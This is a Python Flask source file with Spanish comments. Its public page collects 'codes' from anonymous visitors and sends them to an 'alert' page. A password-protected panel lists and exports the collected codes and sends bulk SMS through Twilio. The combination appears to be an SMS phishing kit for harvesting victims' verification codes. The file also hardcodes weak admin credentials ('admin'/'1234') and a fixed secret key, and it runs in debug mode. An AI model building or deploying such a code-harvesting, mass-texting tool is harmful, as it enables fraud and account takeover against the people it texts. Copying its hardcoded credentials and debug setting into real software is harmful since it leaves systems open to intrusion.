from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash
import sqlite3
from datetime import datetime
from twilio.rest import Client
import re

app = Flask(__name__)
app.secret_key = 'clave_secreta'

# Crear la base de datos si no existe
def init_db():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS codigos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            codigo TEXT NOT NULL,
            fecha TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

# Página principal para ingresar códigos
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        codigo = request.form.get('codigo')
        fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO codigos (codigo, fecha) VALUES (?, ?)', (codigo, fecha))
        conn.commit()
        conn.close()

        return redirect('/alerta')
    return render_template('index.html')

@app.route("/alerta")
def alerta():
    return render_template("alerta.html")

# Login de administrador
@app.route('/admin', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        usuario = request.form.get('usuario')
        clave = request.form.get('clave')
        if usuario == 'admin' and clave == '1234':
            session['admin'] = True
            return redirect(url_for('dashboard'))
        else:
            flash('Credenciales incorrectas', 'danger')
    return render_template('login.html')

# Dashboard de administración
@app.route('/dashboard')
def dashboard():
    if not session.get('admin'):
        return redirect(url_for('login'))

    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM codigos ORDER BY fecha DESC')
    codigos = cursor.fetchall()
    conn.close()

    return render_template('panel_admin.html', codigos=codigos)

# Cerrar sesión
@app.route('/logout')
def logout():
    session.pop('admin', None)
    return redirect('/admin')

# Exportar códigos en JSON
@app.route('/exportar')
def exportar():
    if not session.get('admin'):
        return redirect('/admin')
    
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT codigo, fecha FROM codigos')
    datos = [{'codigo': row[0], 'fecha': row[1]} for row in cursor.fetchall()]
    conn.close()
    return jsonify(datos)

# NUEVO: Enviar SMS
@app.route('/enviar_sms', methods=['GET', 'POST'])
def enviar_sms():
    if not session.get('admin'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        numeros = request.form.get('numeros')
        mensaje = request.form.get('mensaje')

        account_sid = 'TU_ACCOUNT_SID'   # Cambia esto
        auth_token = 'TU_AUTH_TOKEN'     # Cambia esto
        twilio_number = '+123456789'     # Cambia esto (número verificado en Twilio)

        client = Client(account_sid, auth_token)
        numeros_validos = []

        # Validar formato de números
        for num in numeros.split(','):
            n = num.strip()
            if re.match(r'^\+\d{10,15}$', n):
                numeros_validos.append(n)
            else:
                flash(f'Número inválido: {n}', 'danger')

        if not numeros_validos:
            flash('No se enviaron SMS. Corrige los números.', 'danger')
            return redirect('/enviar_sms')

        for numero in numeros_validos:
            try:
                client.messages.create(
                    body=mensaje,
                    from_=twilio_number,
                    to=numero
                )
                flash(f'SMS enviado a {numero}', 'success')
            except Exception as e:
                flash(f'Error enviando a {numero}: {str(e)}', 'danger')

        return redirect('/enviar_sms')

    return render_template('enviar_sms.html')

if __name__ == '__main__':
    init_db()
    app.run(debug=True)

